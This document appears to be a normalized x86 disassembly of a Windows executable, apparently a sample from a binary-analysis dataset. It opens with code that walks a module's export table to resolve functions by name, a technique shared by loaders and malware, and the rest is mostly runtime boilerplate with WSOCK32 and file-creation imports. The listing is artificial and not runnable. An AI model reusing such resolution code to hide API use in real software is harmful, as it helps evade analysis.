mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401170
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4117ae
add esp 0x8
pop ebp
retn
sub_401740
push ebp
mov ebp esp
push 0x180
mov eax [ ebp + 0x8 ]
push eax
call sub_4120e4
add esp 0x8
pop ebp
retn
sub_401f30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov esp ebp
pop ebp
retn
sub_402140
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41264e
add esp 0x8
pop ebp
retn
sub_402750
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_404d60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_405a00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401f30
mov esp ebp
pop ebp
retn
sub_4065b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405a00
mov esp ebp
pop ebp
retn
sub_406630
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401ee0
mov esp ebp
pop ebp
retn
sub_4069f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_406a10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_408440
mov esp ebp
pop ebp
retn
sub_406a30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_407620
mov esp ebp
pop ebp
retn
sub_407080
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4158c0
add esp 0x8
pop ebp
retn
sub_407a10
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_4080e0
push ebp
mov ebp esp
mov [ rw-data ] 0x1
pop ebp
retn
sub_4080f0
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fstp [ rw-data ]
pop ebp
retn
sub_4081a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
xor eax eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] ax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_409aa0
push ebp
mov ebp esp
push 0x22
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call sub_4099a0
add esp 0xc
pop ebp
retn
sub_40a8f0
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop ebp
retn
mov eax [ ebp + 0xc ]
push eax
call sub_4121b5
add esp 0x4
sub_40c1b0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_41134e
mov eax Ordinal_WSOCK32_14@IAT
jmp sub_411358
sub_411358
push ecx
push edx
push eax
push __delay_import_directory_entries
call sub_4113a2
pop edx
pop ecx
jmp eax
sub_4115df
mov eax DestroyEnvironmentBlock@IAT
jmp sub_4115e9
sub_4115e9
push ecx
push edx
push eax
push r--data
call sub_4113a2
pop edx
pop ecx
jmp eax
DestroyEnvironmentBlock
jmp [ DestroyEnvironmentBlock@IAT ]
sub_411600
mov eax CreateEnvironmentBlock@IAT
jmp sub_4115e9
CreateEnvironmentBlock
jmp [ CreateEnvironmentBlock@IAT ]
sub_41174c
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_41763c
pop ecx
pop ecx
retn
sub_411760
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_4171ca
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_418435
retn
push eax
call sub_4171a5
sub_41178a
call sub_4185dc
jmp sub_411639
sub_411930
call sub_416f92
retn
sub_411936
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4118fa
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_411f69
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411ee0
pop ecx
neg eax
pop ecx
sbb eax eax
pop ebp
retn
sub_412064
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411f90
add esp 0x14
pop ebp
retn
sub_41220b
push 0x4
call sub_419ebf
pop ecx
retn
sub_41226d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4121b5
sub_41250e
push [ ebp + 0x18 ]
call sub_413759
pop ecx
retn
sub_412518
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_412482
add esp 0x14
pop ebp
retn
sub_41257b
push 0x4
call sub_419ebf
pop ecx
retn
sub_41299b
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_412a90
push esi
call sub_413759
pop ecx
retn
sub_412b54
push [ ebp + 0x8 ]
call sub_413759
pop ecx
retn
sub_412b5e
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412a98
add esp 0xc
pop ebp
retn
sub_412c7a
push [ ebp + 0x8 ]
call sub_413759
pop ecx
retn
sub_412d71
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_41c0b0
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_412d8c
mov [ ecx ] r--data
jmp sub_41c12a
sub_412dbe
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41c0cd
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_412f67
call sub_41360f
add eax 0x20
push eax
push 0x1
call sub_413795
pop ecx
pop ecx
retn
sub_413132
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41c7dc
add esp 0xc
pop ebp
retn
sub_413396
push 0x7
call sub_419ebf
pop ecx
retn
sub_4134a0
push 0x7
call sub_419ebf
pop ecx
retn
sub_413605
push [ ebp + 0x8 ]
call sub_413759
pop ecx
retn
sub_4136c6
call sub_415d45
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_4121b5
pop ecx
retn
call sub_41de86
sub_413838
push 0xc
push r--data
call sub_4183f0
call sub_41807a
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_4137fb
sub_41386d
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_4171a5
int3
sub_413b86
push [ ebp + 0x14 ]
call sub_413759
pop ecx
retn
sub_413c43
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413b90
add esp 0x14
pop ebp
retn
sub_413e44
mov eax sub_41f354
mov [ rw-data ] eax
mov [ rw-data ] sub_41ea3b
mov [ rw-data ] sub_41e9ef
mov [ rw-data ] sub_41ea28
mov [ rw-data ] sub_41e991
mov [ rw-data ] eax
mov [ rw-data ] sub_41f2cc
mov [ rw-data ] sub_41e9ad
mov [ rw-data ] sub_41e90f
mov [ rw-data ] sub_41e89c
retn
sub_413ea4
mov edi edi
push ebp
mov ebp esp
call sub_413e44
call sub_41f401
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_41f398
sub_415d0d
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_413795
pop ecx
pop ecx
retn
sub_415d3c
push 0x1
call sub_419ebf
pop ecx
retn
sub_415d45
push 0x1
call sub_415c6b
pop ecx
retn
sub_415e5f
push [ ebp + 0xc ]
call sub_413759
pop ecx
retn
sub_415e69
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_41d2ee
call sub_415d4e
add esp 0x14
pop ebp
retn
sub_416089
push [ ebp + 0x8 ]
call sub_413759
pop ecx
retn
sub_416804
push [ ebp + 0x8 ]
call sub_413759
pop ecx
retn
sub_4168ef
push [ ebp + 0x8 ]
call sub_413759
pop ecx
retn
sub_416de9
push 0x4
call sub_419ebf
pop ecx
retn
sub_416f71
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_416f46
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_416f89
push 0x8
call sub_419f99
pop ecx
retn
sub_416f92
push 0x8
call sub_419ebf
pop ecx
retn
sub_41717a
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_419ebf
pop ecx
sub_41718f
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_417063
add esp 0xc
pop ebp
retn
sub_4171a5
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_417063
add esp 0xc
pop ebp
retn
sub_4171bb
push 0x1
push 0x0
push 0x0
call sub_417063
add esp 0xc
retn
sub_4171ca
push 0x1
push 0x1
push 0x0
call sub_417063
add esp 0xc
retn
sub_417449
push sub_417407
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_41763b
retn
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
sub_417d13
xor eax eax
inc eax
retn
sub_417de8
push 0x0
call sub_417d76
pop ecx
retn
sub_417e63
call [ TlsAlloc@IAT ]
retn 0x4
sub_417e6c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_417e86
mov eax [ rw-data ]
retn
sub_417ec0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_417df1
pop ecx
call eax
pop ebp
retn 0x8
sub_417fef
push 0xd
call sub_419ebf
pop ecx
retn
sub_417ff8
push 0xc
call sub_419ebf
pop ecx
retn
sub_4181ae
push 0xd
call sub_419ebf
pop ecx
retn
sub_4181ba
push 0xc
call sub_419ebf
pop ecx
retn
sub_418435
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_41883d
push 0x4
call sub_419ebf
pop ecx
retn
sub_418846
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_418f5d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_418ea8
pop ecx
pop ecx
pop ebp
retn
sub_419ebf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_419f90
push 0xa
call sub_419ebf
pop ecx
retn
sub_41abc8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41b3b7
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_41b470
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41b6bc
push 0xa
call sub_419ebf
pop ecx
retn
sub_41b7bf
push 0xa
call sub_419ebf
pop ecx
retn
sub_41b87d
push 0xb
call sub_419ebf
pop ecx
retn
sub_41b9e5
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_41be03
push 0x1
call sub_419ebf
pop ecx
retn
sub_41bee2
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_41be0c
add esp 0xc
pop ebp
retn 0x4
sub_41bf15
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_422ea9
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_41bf48
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_41be0c
add esp 0xc
pop ebp
retn 0x8
sub_41c0a6
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_41c0b0
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_41c12a
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_4121b5
pop ecx
sub_41c140
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_41c16e
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_422ecb
pop ecx
retn
sub_41c3a1
push 0xc
push r--data
call sub_4183f0
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_41c3be
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41c453
call sub_41c3f1
mov [ rw-data ] eax
xor eax eax
retn
sub_41c515
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41c460
pop ecx
pop ecx
pop ebp
retn
sub_41d052
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41cf96
add esp 0xc
pop ebp
retn
sub_41d157
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d069
add esp 0x10
pop ebp
retn
sub_41df1c
push 0x1
call sub_419ebf
pop ecx
retn
sub_41e05b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_41e892
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_41e9ef
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e9ad
add esp 0x10
pop ebp
retn
sub_41ea28
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41e89c
pop ecx
pop ecx
pop ebp
retn
sub_41ea3b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41e90f
pop ecx
pop ecx
pop ebp
retn
sub_41f6eb
push 0xd
call sub_419ebf
pop ecx
retn
sub_41fab6
push 0xd
call sub_419ebf
pop ecx
retn
sub_41faef
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_41f955
pop ecx
mov [ rw-data ] 0x1
sub_41fe26
push 0xc
call sub_419ebf
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_420226
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_420336
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4137d0
sub_4204e0
push [ ebp + 0x8 ]
call sub_41b6c5
pop ecx
retn
sub_4208ff
push 0x8
push r--data
call sub_4183f0
call sub_41807a
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41aa90
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42091f
xor eax eax
inc eax
retn
sub_420938
push sub_4208ff
call sub_417d76
pop ecx
mov [ rw-data ] eax
retn
sub_420949
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_42099e
push [ rw-data ]
call sub_417df1
pop ecx
retn
sub_420b1f
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_419ebf
pop ecx
sub_420b5b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_420b6a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_420b9a
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_420bb1
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_418435
retn
push 0x8
call [ SetLastError@IAT ]
sub_420ffb
push 0x4
call sub_419ebf
pop ecx
retn
sub_421098
and [ rw-data ] 0x0
retn
sub_42122c
push 0x7
call sub_419ebf
pop ecx
retn
sub_4213d9
mov edi edi
push ebp
mov ebp esp
call sub_421c5c
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4213ea
mov edi edi
push ebp
mov ebp esp
call sub_421c62
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4213fb
mov edi edi
push ebp
mov ebp esp
call sub_421c68
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4216b8
push 0x7
call sub_419ebf
pop ecx
retn
sub_421b67
push 0x6
call sub_419ebf
pop ecx
retn
sub_421ba8
push 0x6
call sub_419ebf
pop ecx
retn
sub_421c5c
mov eax rw-data
retn
sub_421c62
mov eax rw-data
retn
sub_421c68
mov eax rw-data
retn
sub_421c6e
mov eax rw-data
retn
sub_421fe1
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_42210e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421ff7
add esp 0x10
pop ebp
retn
sub_422160
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_422128
pop ecx
pop ecx
pop ebp
retn
sub_422e7d
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_422db4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_422ec8
call eax
retn
sub_422f32
push 0xe
call sub_419ebf
pop ecx
retn
sub_42388c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423720
add esp 0x14
pop ebp
retn
sub_423eef
push 0x2
call sub_416f1d
pop ecx
retn
sub_4247b2
call sub_41807a
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_41fdbc
sub_42489d
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41587f
add esp 0xc
pop ebp
retn
sub_424db2
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_426f3c
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_426f90
push ebp
mov ebp esp
mov ecx rw-data
call sub_4069f0
push sub_426fe0
call sub_411936
add esp 0x4
pop ebp
retn
sub_426fb0
push ebp
mov ebp esp
mov ecx rw-data
call sub_4078b0
pop ebp
retn
sub_426fc0
push ebp
mov ebp esp
mov ecx rw-data
call sub_4081a0
pop ebp
retn
sub_426fd0
push ebp
mov ebp esp
mov ecx rw-data
call sub_406a10
pop ebp
retn
sub_426fe0
push ebp
mov ebp esp
mov ecx rw-data
call sub_406a30
pop ebp
retn
sub_426fef
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_41c12a
